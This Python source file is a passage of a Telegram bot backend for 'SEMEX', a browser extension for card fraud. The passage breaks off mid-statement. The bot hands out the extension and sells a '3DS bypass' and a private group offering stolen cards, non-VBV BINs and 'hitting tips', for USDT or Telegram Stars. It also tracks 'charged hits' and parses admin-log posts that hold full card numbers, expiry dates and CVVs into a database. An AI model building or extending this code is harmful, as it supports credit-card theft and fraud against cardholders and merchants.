"""Telegram bot webhook + command handler for SEMEX.

The webhook receives updates from Telegram and dispatches slash-commands. The
current MVP surface:
    /start   – onboarding message + link to auth OTP flow
    /help    – lists available commands
    /get     – sends the SEMEX extension .zip as a Telegram document, so any
               public user can install without hunting for a link

Payments, OTP, and hit-forwarding continue to work through the existing routes;
this file only adds the inbound command surface.
"""
from __future__ import annotations

import logging
import os
import re
from pathlib import Path

from fastapi import APIRouter, Request

from config import settings
from services.telegram import (
    answer_callback_query,
    answer_pre_checkout_query,
    copy_message,
    send_document,
    send_invoice,
    send_message,
)

log = logging.getLogger("semex.bot")

router = APIRouter(prefix="/api/telegram", tags=["telegram-bot"])

if not (getattr(settings, "TELEGRAM_WEBHOOK_SECRET", "") or "").strip():
    log.critical(
        "TELEGRAM_WEBHOOK_SECRET is not set — the webhook endpoint accepts "
        "unauthenticated/forged POSTs. Set the env var and re-run setWebhook "
        "with secret_token."
    )


_EXTENSION_BASE = Path(settings.APP_BASE_DIR)
EXTENSION_ZIP_CANDIDATES = [
    str(_EXTENSION_BASE / "semex-v2.2.0.zip"),
    str(_EXTENSION_BASE / "semex.zip"),
]


async def _find_latest_release_doc() -> dict | None:
    """Return the latest published extension release from Mongo, else None."""
    try:
        from db import get_db
        db = get_db()
        doc = await db.extension_releases.find_one({"is_latest": True})
        if doc:
            return doc
        return await db.extension_releases.find_one({}, sort=[("published_at", -1)])
    except Exception as e:
        log.warning("release lookup failed: %s", e)
        return None


async def _resolve_zip() -> tuple[Path, dict | None] | None:
    """Return (path, release_doc_or_None). Prefers a published release,
    falls back to the legacy on-disk build zip. Returns None if nothing found.
    """
    doc = await _find_latest_release_doc()
    if doc and doc.get("file_path"):
        p = Path(doc["file_path"])
        if p.exists() and p.stat().st_size > 0:
            return p, doc
    fallback = _find_extension_zip()
    return (fallback, None) if fallback else None


def _find_extension_zip() -> Path | None:
    """Legacy fallback — used only when no published release exists."""
    for path in EXTENSION_ZIP_CANDIDATES:
        p = Path(path)
        if p.exists() and p.stat().st_size > 0:
            return p
    for p in Path(settings.APP_BASE_DIR).glob("semex*.zip"):
        if p.stat().st_size > 0:
            return p
    return None


async def _cmd_buy(chat_id: int, username: str | None) -> None:
    """Show premium plans + private-group offer + USDT wallets (BEP20/TRC20/TON).
    Manual flow: user pays → /paid proof → owner verifies → owner activates the
    plan (admin panel) and/or delivers the group invite via /sendlink."""
    owner_handle = (settings.OWNER_HANDLE or settings.TELEGRAM_BOT_USERNAME or "SemexBot").replace("@", "")
    price_monthly = getattr(settings, "PLAN_PRICE_MONTHLY", None) or "$100"
    price_yearly = (getattr(settings, "PLAN_PRICE_YEARLY", "") or "").strip()
    price_lifetime = (getattr(settings, "PLAN_PRICE_LIFETIME", "") or "").strip()
    group_weekly = getattr(settings, "GROUP_PRICE_WEEKLY", None) or "$25"
    group_monthly = getattr(settings, "GROUP_PRICE_MONTHLY", None) or "$50"
    # USDT payment addresses (three networks — pick lowest fee)
    usdt_bep20 = getattr(settings, "PAYMENT_USDT_BEP20", "")
    usdt_trc20 = getattr(settings, "PAYMENT_USDT_TRC20", "")
    usdt_ton = getattr(settings, "PAYMENT_USDT_TON", "")

    name_line = f" @{username}" if username else ""
    lines = [
        f"<b>💎 SEMEX Premium</b>{name_line}",
        "─ ─ ─ ─ ─ ─ ─ ─ ─ ─",
        "",
        "<b>📦 BOT ACCESS (Premium):</b>",
        f"• <b>MONTHLY</b> — {price_monthly}",
    ]
    if price_yearly:
        lines.append(f"• <b>YEARLY</b>  — {price_yearly}")
    if price_lifetime:
        lines.append(f"• <b>LIFETIME</b> — {price_lifetime} one-time")
    lines += [
        "",
        "Includes: 3DS Bypass (Stripe) · full-quality screenshots · "
        "extended history · priority support",
        "",
        "<b>🔥 PRIVATE GROUP — CC Drop + Methods:</b>",
        f"• <b>WEEKLY</b> — {group_weekly}",
        f"• <b>MONTHLY</b> — {group_monthly}",
        "",
        "You get: fresh CCs · mix lines · unchecked lines · on-request CCs "
        "(weekly, 1 person) · hitting tips · charged BINs + sites · "
        "non-VBV BINs · non-VBV CCs & more on request.",
        "<i>Refund available for any issues.</i>",
        "",
        "<b>💵 Payment — USDT:</b>",
        "",
        "✅ <b>BEP20</b> (BNB Smart Chain)",
        f"<code>{usdt_bep20}</code>",
        "",
        "💰 <b>TRC20</b> (Tron)",
        f"<code>{usdt_trc20}</code>",
        "",
        "🪙 <b>TON</b> (The Open Network)",
        f"<code>{usdt_ton}</code>",
        "",
        "<b>➡️ How to buy:</b>",
        "1. Send USDT to any address above (BEP20 recommended — lowest fee)",
        "2. Screenshot the transaction (must show <b>amount + tx hash</b>)",
        "3. Run <code>/paid</code> in this chat, then send the screenshot",
        f"4. Owner @{owner_handle} verifies → activates your plan and/or sends "
        "your private-group invite right here in the bot",
        "",
        "<i>All tap-to-copy addresses — hold on mobile to copy.</i>",
        "",
        "⭐ <b>Prefer Telegram Stars?</b> Tap a button below — instant, in-app, "
        "no crypto needed. Activation is automatic.",
    ]
    await send_message(chat_id, "\n".join(lines), reply_markup=_buy_stars_kb())


# ─── Telegram Stars (XTR) payments ─────────────────────────────────────────
# Payload format: stars:<product> where product ∈ plan_monthly / group_weekly /
# group_monthly. Amounts come from config (env-overridable).

def _stars_catalog() -> dict:
    return {
        "plan_monthly": {
            "title": "SEMEX Premium — Monthly",
            "desc": "30 days of SEMEX Premium (3DS bypass, full screenshots, priority support).",
            "stars": getattr(settings, "PLAN_STARS_MONTHLY", 5000),
            "usd": getattr(settings, "PLAN_PRICE_MONTHLY", "$100"),
        },
        "group_weekly": {
            "title": "Private Group — Weekly",
            "desc": "7 days of the SEMEX private group (CC drop + methods).",
            "stars": getattr(settings, "GROUP_STARS_WEEKLY", 1250),
            "usd": getattr(settings, "GROUP_PRICE_WEEKLY", "$25"),
        },
        "group_monthly": {
            "title": "Private Group — Monthly",
            "desc": "30 days of the SEMEX private group (CC drop + methods).",
            "stars": getattr(settings, "GROUP_STARS_MONTHLY", 2500),
            "usd": getattr(settings, "GROUP_PRICE_MONTHLY", "$50"),
        },
    }


def _buy_stars_kb() -> dict:
    """Inline keyboard under /buy offering Stars payment per product."""
    cat = _stars_catalog()
    rows = [
        [{"text": f"⭐ Premium Monthly — {cat['plan_monthly']['stars']} ⭐ ({cat['plan_monthly']['usd']})", "callback_data": "stars:plan_monthly"}],
        [{"text": f"⭐ Group Weekly — {cat['group_weekly']['stars']} ⭐ ({cat['group_weekly']['usd']})", "callback_data": "stars:group_weekly"}],
        [{"text": f"⭐ Group Monthly — {cat['group_monthly']['stars']} ⭐ ({cat['group_monthly']['usd']})", "callback_data": "stars:group_monthly"}],
    ]
    return {"inline_keyboard": rows}


async def _send_stars_invoice(chat_id: int, product: str) -> None:
    item = _stars_catalog().get(product)
    if not item:
        return
    res = await send_invoice(
        chat_id,
        title=item["title"],
        description=item["desc"],
        payload=f"stars:{product}",
        stars=item["stars"],
    )
    if not res or not res.get("ok"):
        log.warning("sendInvoice failed for %s: %s", product, res)
        await send_message(
            chat_id,
            "⚠️ Couldn't create the Stars invoice right now. "
            "Please try again in a minute, or pay with USDT above.",
        )


async def _handle_pre_checkout(pcq: dict) -> None:
    """Approve every pre-checkout query immediately — the invoice amounts are
    bot-generated seconds earlier, so there is nothing to re-validate beyond
    the payload being one of ours."""
    qid = pcq.get("id")
    payload = pcq.get("invoice_payload", "")
    if not qid:
        return
    if payload.startswith("stars:") and payload.split(":", 1)[1] in _stars_catalog():
        await answer_pre_checkout_query(qid, ok=True)
    else:
        await answer_pre_checkout_query(qid, ok=False, error_message="Unknown product. Please reopen /buy.")


async def _fulfill_stars_payment(message: dict) -> None:
    """successful_payment handler — automatic fulfillment, no owner action:
    plan_monthly → extend plan 30 days; group_* → DM the private-group invite.
    Always notifies the owner with the charge id (needed for refunds)."""
    from datetime import datetime, timedelta, timezone
    sp = message.get("successful_payment") or {}
    payload = sp.get("invoice_payload", "")
    charge_id = sp.get("telegram_payment_charge_id", "")
    stars = sp.get("total_amount", 0)
    chat = message.get("chat") or {}
    chat_id = chat.get("id")
    frm = message.get("from") or {}
    uid = frm.get("id") or chat_id
    username = frm.get("username") or "-"
    product = payload.split(":", 1)[1] if payload.startswith("stars:") else ""
    item = _stars_catalog().get(product)
    if not item or not chat_id:
        log.warning("stars payment with unknown payload %r (charge %s)", payload, charge_id)
        return

    # Record the payment (audit trail + refund handle)
    try:
        from db import get_db
        await get_db().star_payments.update_one(
            {"charge_id": charge_id},
            {"$setOnInsert": {
                "charge_id": charge_id,
                "telegram_id": uid,
                "username": username,
                "product": product,
                "stars": stars,
                "paid_at": datetime.now(timezone.utc),
            }},
            upsert=True,
        )
    except Exception as e:
        log.warning("star payment record failed (continuing): %s", e)

    fulfilled = False
    if product == "plan_monthly":
        try:
            from db import get_db
            db = get_db()
            user_doc = await db.users.find_one({"telegram_id": uid})
            now = datetime.now(timezone.utc)
            existing = (user_doc or {}).get("plan_expires_at")
            if existing and existing.tzinfo is None:
                existing = existing.replace(tzinfo=timezone.utc)
            base = existing if (existing and existing > now) else now
            new_expiry = base + timedelta(days=30)
            await db.users.update_one(
                {"telegram_id": uid},
                {"$set": {"plan": "MONTHLY", "plan_expires_at": new_expiry,
                          "is_banned": False, "banned_reason": None}},
            )
            await send_message(
                chat_id,
                "🎉 <b>Payment received — SEMEX Premium activated!</b>\n\n"
                f"⭐ {stars} Stars · <b>MONTHLY</b> (30 days"
                + (", stacked on your remaining time" if existing and existing > now else "")
                + f")\nValid until <b>{new_expiry:%Y-%m-%d}</b>.\n\n"
                "Open the extension — premium is live immediately. 🔥",
            )
            fulfilled = True
        except Exception as e:
            log.exception("stars plan fulfillment failed for %s: %s", uid, e)
    else:  # group_weekly / group_monthly
        link = (getattr(settings, "PREMIUM_GROUP_LINK", "") or "").strip()
        period = "7 days" if product == "group_weekly" else "30 days"
        if link:
            try:
                await send_message(
                    chat_id,
                    "🎉 <b>Payment received — welcome to the SEMEX Private Group!</b>\n\n"
                    f"⭐ {stars} Stars · <b>{period}</b>\n\n"
                    f"👉 <b>Your invite:</b> {link}\n\n"
                    "⚠️ <i>Personal invite — do not share. If it stops working, "
                    "message the owner.</i>",
                )
                fulfilled = True
            except Exception as e:
                log.exception("stars group invite failed for %s: %s", uid, e)
        else:
            log.warning("PREMIUM_GROUP_LINK not set — cannot auto-fulfill %s for %s", product, uid)

    if not fulfilled:
        await send_message(
            chat_id,
            "✅ <b>Payment received!</b> Activation hit a snag on our side — "
            "the owner has been notified and will complete it shortly. "
            "Keep this chat as your receipt.",
        )

    # Owner notification — always, with charge id for refunds (refundStarPayment)
    try:
        await send_message(
            settings.ADMIN_TELEGRAM_ID,
            "⭐ <b>STARS PAYMENT</b>\n"
            f"👤 User: <code>@{username}</code> (<code>{uid}</code>)\n"
            f"📦 Product: <b>{item['title']}</b>\n"
            f"⭐ Amount: <b>{stars}</b> XTR\n"
            f"🧾 Charge: <code>{charge_id}</code>\n"
            f"{'✅ Auto-fulfilled' if fulfilled else '⚠️ NEEDS MANUAL FULFILLMENT'}",
        )
    except Exception as e:
        log.warning("owner stars notification failed: %s", e)


# ─── /paid proof-of-payment flow ───────────────────────────────────────────
# Users who paid via /buy run /paid to enter proof-submit mode. Their NEXT
# photo message is copied to the owner (ADMIN_TELEGRAM_ID) with a rich caption
# so the owner can verify and activate. Simple in-memory state — expires
# after PROOF_WAIT_SECONDS.
_PROOF_STATE: dict[int, dict] = {}
_PROOF_WAIT_SECONDS = 30 * 60  # 30 minutes to send the screenshot


def _proof_expired(entry: dict, now: float) -> bool:
    return (now - entry.get("ts", 0)) > _PROOF_WAIT_SECONDS


async def _cmd_paid(chat_id: int, username: str | None, telegram_id: int | None) -> None:
    """Enter proof-submission mode. The user's next photo is forwarded to
    the owner. State expires after 30 minutes."""
    import time
    _PROOF_STATE[chat_id] = {
        "ts": time.time(),
        "username": username,
        "telegram_id": telegram_id or chat_id,
    }
    await send_message(
        chat_id,
        (
            "🧾 <b>Proof of payment — awaiting screenshot</b>\n\n"
            "Send the payment screenshot (as a photo, not a file) as your NEXT message. "
            "Add the plan name (MONTHLY / YEARLY / LIFETIME) in the photo caption if you can.\n\n"
            "You have <b>30 minutes</b> to submit. To cancel, run /cancel.\n\n"
            "<i>The screenshot goes directly to the owner for manual verification. "
            "Nothing is stored on our servers.</i>"
        ),
    )


async def _cmd_cancel(chat_id: int) -> None:
    _PROOF_STATE.pop(chat_id, None)
    await send_message(chat_id, "❎ Cancelled. No proof submitted.")


async def _cmd_sendlink(chat_id: int, from_user_id: int | None, args: list[str]) -> None:
    """Owner-only: deliver the private-group invite to a verified buyer.

    Usage: /sendlink <telegram_id> [custom_invite_link]
    Sends PREMIUM_GROUP_LINK (or the custom link) to the user's DM from the bot,
    then confirms back to the owner. Keeps the invite off any public surface."""
    if from_user_id != settings.ADMIN_TELEGRAM_ID:
        # Silent ignore — never reveal this command exists.
        return
    link = (getattr(settings, "PREMIUM_GROUP_LINK", "") or "").strip()
    target_id: int | None = None
    if args:
        try:
            target_id = int(args[0])
        except ValueError:
            target_id = None
    if len(args) > 1 and args[1].strip():
        link = args[1].strip()
    if target_id is None:
        await send_message(
            chat_id,
            "Usage: <code>/sendlink &lt;telegram_id&gt; [invite_link]</code>\n"
            "Sends the premium-group invite to that user's DM.",
        )
        return
    if not link:
        await send_message(
            chat_id,
            "⚠️ PREMIUM_GROUP_LINK is not set on the server and no link was given.\n"
            "Set the env var or pass a link: <code>/sendlink &lt;id&gt; &lt;link&gt;</code>",
        )
        return
    try:
        await send_message(
            target_id,
            (
                "🎉 <b>Payment confirmed — welcome to the SEMEX Private Group!</b>\n\n"
                f"👉 <b>Your invite:</b> {link}\n\n"
                "⚠️ <i>This invite is personal — do not share it. "
                "If it stops working, message the owner.</i>"
            ),
        )
        await send_message(
            chat_id,
            f"✅ Invite sent to <code>{target_id}</code>.",
        )
    except Exception as e:
        log.exception("sendlink failed for %s: %s", target_id, e)
        await send_message(
            chat_id,
            f"⚠️ Couldn't DM <code>{target_id}</code> — the user must have started "
            "the bot at least once (blocked bots / no prior /start will fail).",
        )


async def _forward_proof_to_owner(
    chat_id: int,
    user_message_id: int,
    photo_caption: str | None,
) -> None:
    """Copy the user's photo message to the owner with a rich admin caption."""
    import time
    entry = _PROOF_STATE.get(chat_id)
    if not entry or _proof_expired(entry, time.time()):
        # Not in proof-submit mode → ignore silently.
        return
    _PROOF_STATE.pop(chat_id, None)  # single-use
    handle = entry.get("username") or "-"
    tid = entry.get("telegram_id") or chat_id
    user_caption = (photo_caption or "").strip()
    admin_caption = (
        "🧾 <b>NEW PROOF OF PAYMENT</b>\n"
        f"👤 User: <code>@{handle}</code>\n"
        f"🆔 Telegram ID: <code>{tid}</code>\n"
        f"💬 Chat ID: <code>{chat_id}</code>\n"
        + (f"📝 User note: <i>{user_caption[:400]}</i>\n" if user_caption else "")
        + "\n"
        "<b>Next steps:</b>\n"
        f"• Verify the tx on-chain (BEP20 / TRC20 / TON)\n"
        f"• Plan purchase → admin panel → find user <code>{tid}</code> → <b>Extend</b>\n"
        f"• Group purchase → reply <code>/sendlink {tid}</code> to DM them the invite\n"
        f"• DM the user @{handle} to confirm"
    )
    try:
        await copy_message(
            to_chat_id=settings.ADMIN_TELEGRAM_ID,
            from_chat_id=chat_id,
            message_id=user_message_id,
            caption=admin_caption,
        )
        await send_message(
            chat_id,
            (
                "✅ <b>Proof received!</b>\n\n"
                "Your screenshot was sent to the owner for verification. "
                "You'll get a DM here as soon as your plan is activated (usually within a few hours)."
            ),
        )
    except Exception as e:
        log.exception("proof forward failed: %s", e)
        await send_message(
            chat_id,
            "⚠️ Couldn't forward the proof — please try again or DM the owner directly.",
        )


def _owner_support_url() -> str | None:
    handle = (getattr(settings, "OWNER_HANDLE", "") or "").strip().lstrip("@")
    return f"https://t.me/{handle}" if handle else None


def _main_menu_kb() -> dict:
    """Inline keyboard shown under the /start welcome. Buttons that have a real
    URL open it directly; otherwise they fall back to a callback that replies
    with the relevant info (so nothing is ever a dead button)."""
    # Row 1 — download the extension (always a callback → sends the .zip document)
    row1 = [{"text": "🧩 Get Extension", "callback_data": "menu:get"}]

    # Row 2 — premium group + support. The group link is NEVER exposed here:
    # the button always opens the offer/payment flow; the owner delivers the
    # invite manually via /sendlink after verifying payment.
    premium_btn = {"text": "💎 Premium Group", "callback_data": "menu:premium"}
    support_url = _owner_support_url()
    if support_url:
        support_btn = {"text": "🛟 Contact Support", "url": support_url}
    else:
        support_btn = {"text": "🛟 Contact Support", "callback_data": "menu:support"}
    row2 = [premium_btn, support_btn]

    # Row 3 — settings (saved BINs, account, etc.)
    row3 = [{"text": "⚙️ Settings", "callback_data": "menu:settings"}]

    return {"inline_keyboard": [row1, row2, row3]}


def _welcome_text(name: str, user_id: int | None) -> str:
    return (
        "⚜️ <b>Welcome to SEMEX</b> ⚜️\n"
        "─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
        f"👤 <b>User:</b> {name}\n"
        f"🆔 <b>ID:</b> <code>{user_id if user_id is not None else '—'}</code>\n"
        "─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n"
        "SEMEX is your premium checkout-automation suite. "
        "Use the menu below to grab the extension, join the private group, "
        "reach support, or manage your settings.\n\n"
        "📝 <i>Note: keep your login OTP private — never share it with anyone.</i>\n\n"
        "Type /help anytime for the full command list."
    )


async def _cmd_start(chat_id: int, username: str | None, user_id: int | None = None) -> None:
    name = f"@{username}" if username else "there"
    await send_message(chat_id, _welcome_text(name, user_id), reply_markup=_main_menu_kb())


async def _cmd_menu(chat_id: int, username: str | None, user_id: int | None = None) -> None:
    """Re-open the main menu on demand."""
    await _cmd_start(chat_id, username, user_id)


async def _cmd_settings(chat_id: int, from_user_id: int | None) -> None:
    """Settings surface — account plan + saved BINs, straight from the bot."""
    await _cmd_status(chat_id, from_user_id)
    await _cmd_bins(chat_id, from_user_id)


async def _handle_callback(callback: dict) -> None:
    """Dispatch inline-button taps from the main menu."""
    data = (callback.get("data") or "").strip()
    cb_id = callback.get("id")
    msg = callback.get("message") or {}
    chat = msg.get("chat") or {}
    chat_id = chat.get("id")
    frm = callback.get("from") or {}
    from_user_id = frm.get("id")
    username = frm.get("username")

    # Ack immediately so the client's spinner clears.
    if cb_id:
        try:
            await answer_callback_query(cb_id)
        except Exception:
            pass
    if not chat_id:
        return

    if data == "menu:get":
        await _cmd_get(chat_id)
    elif data == "menu:premium":
        await _cmd_buy(chat_id, username)
    elif data == "menu:support":
        handle = (getattr(settings, "OWNER_HANDLE", "") or "").strip().lstrip("@")
        if handle:
            await send_message(chat_id, f"🛟 <b>Support</b>\n\nMessage the owner directly: @{handle}")
        else:
            await send_message(chat_id, "🛟 <b>Support</b>\n\nSupport contact isn't configured yet — please try again later.")
    elif data == "menu:settings":
        await _cmd_settings(chat_id, from_user_id)
    elif data == "menu:home":
        await _cmd_start(chat_id, username, from_user_id)
    elif data.startswith("stars:"):
        await _send_stars_invoice(chat_id, data.split(":", 1)[1])
    # Unknown callbacks are silently ignored.


async def _cmd_help(chat_id: int) -> None:
    text = (
        "<b>🛠 SEMEX Bot Commands</b>\n\n"
        "<b>📊 Your account:</b>\n"
        "/status – plan, expiry & hit counters\n"
        "/history – last 5 charged hits\n"
        "/bins – your saved BINs\n"
        "/savebin 414720 [label] – save a BIN to your extension list\n\n"
        "<b>🚀 Getting started:</b>\n"
        "/start – onboarding + main menu\n"
        "/menu – re-open the button menu\n"
        "/settings – account + saved BINs\n"
        "/get – download the extension .zip\n"
        "/buy – premium plans + private group offer + USDT addresses\n"
        "/paid – submit proof-of-payment screenshot\n"
        "/cancel – cancel a pending /paid submission\n"
        "/help – this message\n\n"
        "Any issues? Message the owner directly."
    )
    await send_message(chat_id, text)


async def _cmd_savebin(chat_id: int, from_user_id: int | None, args: list[str]) -> None:
    """Save a BIN from the bot straight into the same `user_bins` collection the
    extension reads via GET /api/user/bins — saved BINs appear in the checkout
    overlay quick-switcher on the next sync. Mirrors routes/user.py POST /bins.
    """
    from db import get_db
    from models import UserBin
    from services.bin_lookup import lookup_bin
    from services.sync import sync_manager

    tid = from_user_id or chat_id
    bin_clean = "".join(c for c in (args[0] if args else "") if c.isdigit())[:19]
    label = (" ".join(args[1:]).strip()[:40] or None) if len(args) > 1 else None
    if len(bin_clean) < 6:
        await send_message(chat_id, "Usage: /savebin &lt;BIN&gt; [label]\nExample: <code>/savebin 414720 work</code>")
        return

    meta = {}
    try:
        m = await lookup_bin(bin_clean[:8])
        if m:
            meta = m
    except Exception:
        meta = {}

    db = get_db()
    try:
        b = UserBin(
            telegram_id=tid,
            bin=bin_clean,
            label=label,
            brand=meta.get("brand"),
            card_type=meta.get("cardType"),
            level=meta.get("level"),
            bank=meta.get("bank"),
            country=meta.get("country"),
            country_code=meta.get("countryCode"),
        )
        await db.user_bins.insert_one(b.to_mongo())
    except Exception as e:
        if "duplicate" in str(e).lower():
            await send_message(chat_id, f"⚠️ <code>{bin_clean}</code> is already in your list.")
            return
        raise
    # Live-push to any open extension dashboards so the new BIN appears instantly.
    sync_manager.publish(tid, "bins")

    meta_bits = " · ".join(x for x in [meta.get("brand"), meta.get("level"), meta.get("bank"), meta.get("country")] if x)
    label_txt = f" ({label})" if label else ""
    await send_message(
        chat_id,
        f"✅ BIN <code>{bin_clean[:8]}</code>{label_txt} saved — it will show in the extension's BIN list."
        + (f"\n{meta_bits}" if meta_bits else ""),
    )


# ─── Self-service account commands ────────────────────────────────────────────

async def _cmd_status(chat_id: int, from_user_id: int | None) -> None:
    """Show the user's plan, expiry, and hit counters."""
    from db import get_db
    db = get_db()
    tid = from_user_id or chat_id
    user = await db.users.find_one({"telegram_id": tid})
    if not user:
        await send_message(
            chat_id,
            "⚠️ No account found for your Telegram ID.\n"
            "Open the SEMEX extension and log in first.",
        )
        return
    plan = user.get("plan") or "TRIAL"
    exp = user.get("plan_expires_at")
    if exp:
        if hasattr(exp, "strftime"):
            exp_str = exp.strftime("%Y-%m-%d")
        else:
            exp_str = str(exp)[:10]
    else:
        exp_str = "—"
    hits = user.get("hit_count", 0)
    charged = user.get("charged_count", 0)
    uname = user.get("telegram_username")
    name_line = f"@{uname}" if uname else str(tid)
    lines = [
        "📋 <b>SEMEX — Account Status</b>",
        "",
        f"👤 <b>User:</b> {name_line}",
        f"🏷 <b>Plan:</b> {plan}",
        f"📅 <b>Expires:</b> {exp_str}",
        "",
        f"🎯 <b>Total Hits:</b> {hits}",
        f"✅ <b>Charged:</b> {charged}",
        "",
        "Use /history to see your last charged hits.",
    ]
    await send_message(chat_id, "\n".join(lines))


async def _cmd_history(chat_id: int, from_user_id: int | None) -> None:
    """Show last 5 charged hits — safe fields only (no full card numbers)."""
    from db import get_db
    db = get_db()
    tid = from_user_id or chat_id
    cursor = (
        db.hits.find(
            {"telegram_id": tid, "status": {"$in": ["charged", "success", "approved", "succeeded", "captured"]}},
            # Exclude screenshot and full card number from bot output
            {"screenshot_b64": 0},
        )
        .sort("created_at", -1)
        .limit(5)
    )
    hits = []
    async for doc in cursor:
        hits.append(doc)

    if not hits:
        await send_message(chat_id, "📭 No charged hits found yet.")
        return

    lines = ["💳 <b>Last Charged Hits</b>\n"]
    for i, h in enumerate(hits, 1):
        card = h.get("card_number") or ""
        masked = ("•" * max(0, len(card) - 4) + card[-4:]) if len(card) >= 4 else "•••"
        gw = h.get("gateway") or h.get("hostname") or "—"
        amt = h.get("amount")
        cur = h.get("currency") or ""
        amt_str = f"{amt:.2f} {cur}".strip() if amt else "—"
        ts = h.get("created_at")
        date_str = ts.strftime("%Y-%m-%d %H:%M") if ts and hasattr(ts, "strftime") else "—"
        lines.append(
            f"{i}. <code>{masked}</code>\n"
            f"   💰 {amt_str}  |  🌐 {gw}\n"
            f"   🕐 {date_str}"
        )
    await send_message(chat_id, "\n".join(lines))


async def _cmd_bins(chat_id: int, from_user_id: int | None) -> None:
    """List the user's saved BINs."""
    from db import get_db
    db = get_db()
    tid = from_user_id or chat_id
    cursor = db.user_bins.find({"telegram_id": tid}).sort("created_at", -1).limit(20)
    bins = []
    async for doc in cursor:
        bins.append(doc)

    if not bins:
        await send_message(
            chat_id,
            "📭 No saved BINs yet.\nOpen the SEMEX dashboard → BINs tab to add some.",
        )
        return

    lines = [f"💳 <b>Your Saved BINs</b> ({len(bins)} shown)\n"]
    for b in bins:
        raw_num = b.get("bin") or "—"
        # Mask anything beyond an 8-digit BIN prefix — saved values can be up to
        # 19 digits (full card numbers), so only expose the BIN portion.
        if len(raw_num) > 8:
            display_num = raw_num[:6] + "•" * (len(raw_num) - 6)
        else:
            display_num = raw_num
        label = b.get("label") or ""
        brand = b.get("brand") or ""
        level = b.get("level") or ""
        bank = b.get("bank") or ""
        meta_parts = [x for x in [brand.upper() if brand else "", level.upper() if level else "", bank] if x]
        meta_str = " · ".join(meta_parts[:2]) if meta_parts else ""
        label_str = f" <i>{label}</i>" if label else ""
        meta_line = f"\n   {meta_str}" if meta_str else ""
        lines.append(f"• <code>{display_num}</code>{label_str}{meta_line}")

    if len(bins) == 20:
        lines.append("\n<i>Showing 20 most recent. Open the dashboard to see all.</i>")
    await send_message(chat_id, "\n".join(lines))


async def _cmd_get(chat_id: int) -> None:
    resolved = await _resolve_zip()
    if not resolved:
        await send_message(
            chat_id,
            "⚠️ The extension package isn't available right now. Ask the owner to publish a new build in the admin panel.",
        )
        log.warning("/get requested but no extension zip found (no release + no fallback)")
        return
    zip_path, release_doc = resolved
    try:
        data = zip_path.read_bytes()
        version = release_doc.get("version") if release_doc else "latest"
        notes = (release_doc.get("notes") if release_doc else "") or ""
        caption = (
            f"🚀 <b>SEMEX Extension — v{version}</b>\n\n"
            + (f"<i>{notes.strip()}</i>\n\n" if notes else "")
            + "1. Unzip this file\n"
            "2. Open <code>chrome://extensions</code>\n"
            "3. Toggle <b>Developer mode</b>\n"
            "4. Click <b>Load unpacked</b> → select the unzipped folder\n\n"
            "Then click the SEMEX icon in Chrome's toolbar to sign in."
        )
        r = await send_document(chat_id, data, filename=zip_path.name, caption=caption)
        if not (r and r.get("ok")):
            await send_message(chat_id, "⚠️ Upload failed — please try again in a moment.")
            return
        # Bump download counter (best-effort)
        if release_doc and release_doc.get("_id"):
            try:
                from db import get_db
                await get_db().extension_releases.update_one(
                    {"_id": release_doc["_id"]},
                    {"$inc": {"download_count": 1}},
                )
            except Exception:
                pass
    except Exception as e:
        log.exception("send_document failed: %s", e)
        await send_message(chat_id, "⚠️ Something went wrong sending the extension. Please try again shortly.")


# ── Admin-log failsafe ingester ────────────────────────────────────────────
# The Telegram admin-log channel is a durable, human-readable record of every
# CHARGED/LIVE hit, and every post carries the originating user's Telegram id
# and full card. If the primary /status DB insert ever fails (e.g. the row's
# user id wasn't captured), this recovers the record straight from the channel
# post so the admin panel is never missing a card. Idempotent: a hit that was
# already persisted on the happy path is skipped.
_LOG_ID_RE = re.compile(r"id:\s*(\d{4,})")
_LOG_CARD_RE = re.compile(r"Card\s*➔\s*([0-9][0-9|/ ]{6,})")
_LOG_STATUS_RE = re.compile(r"Status\s*➔\s*(.+)")
_LOG_SITE_RE = re.compile(r"Site\s*➔\s*(.+)")
_LOG_RESP_RE = re.compile(r"Response\s*➔\s*(.+)")
_LOG_GW_RE = re.compile(r"Gateway\s*➔\s*(.+)")
_LOG_EMAIL_RE = re.compile(r"Customer Email\s*➔\s*(.+)")
_LOG_IP_RE = re.compile(r"IP\s*➔\s*([0-9a-fA-F:.]+)")


def _first(rx: "re.Pattern[str]", text: str) -> str | None:
    m = rx.search(text or "")
    return m.group(1).strip() if m else None


async def _ingest_admin_log_post(post: dict) -> None:
    """Parse a channel post from the admin-log channel and upsert the hit as a
    failsafe. Only acts on posts that look like a formatted ADMIN LOG hit (they
    contain a `id:` handle and a `Card ➔` line)."""
    text = (post.get("caption") or post.get("text") or "")
    if "Card" not in text or "id:" not in text:
        return
    tg_raw = _first(_LOG_ID_RE, text)
    card_raw = _first(_LOG_CARD_RE, text)
    if not tg_raw or not card_raw:
        return
    try:
        telegram_id = int(tg_raw)
    except ValueError:
        return

    parts = [p.strip() for p in re.split(r"[|/]", card_raw) if p.strip()]
    card_number = parts[0] if parts else None
    if not card_number or not card_number.isdigit():
        return
    card_month = parts[1] if len(parts) > 1 else None
    card_year = parts[2] if len(parts) > 2 else None
    card_cvv = parts[3] if len(parts) > 3 else None

    # The admin-log status line begins with an emoji (e.g. "⚡️ USD 9.99 Charged! ✅"
    # or "🔥 LIVE 🔥"), so classify by keyword anywhere in the line — NOT by the
    # first character. Only CHARGED and LIVE are ever posted to the admin log.
    status_line = (_first(_LOG_STATUS_RE, text) or "").lower()
    if any(k in status_line for k in ("charged", "success", "approve", "captured", "succeed")):
        status = "charged"
    else:
        status = "live"  # default: admin log only carries charged + live

    from db import get_db
    db = get_db()
    # Idempotency: skip if a row for this user+PAN already exists on the happy
    # path (fast pre-check). The authoritative guard against concurrent/edited
    # channel-post delivery is the atomic upsert below, backed by the partial
    # unique index on recovered rows (see db.init_indexes).
    try:
        existing = await db.hits.find_one(
            {"telegram_id": telegram_id, "card_number": card_number},
            {"_id": 1},
        )
    except Exception as e:
        log.warning("failsafe dedup lookup failed: %s", e)
        return
    if existing:
        return

    from models import Hit
    site = _first(_LOG_SITE_RE, text)
    hit = Hit(
        telegram_id=telegram_id,
        status=status,
        card_number=card_number,
        card_exp_month=card_month,
        card_exp_year=card_year,
        card_cvv=card_cvv,
        bin=card_number[:6] if len(card_number) >= 6 else None,
        response=_first(_LOG_RESP_RE, text),
        gateway=_first(_LOG_GW_RE, text),
        site_url=site,
        hostname=site,
        customer_email=_first(_LOG_EMAIL_RE, text),
        ip=_first(_LOG_IP_RE, text),
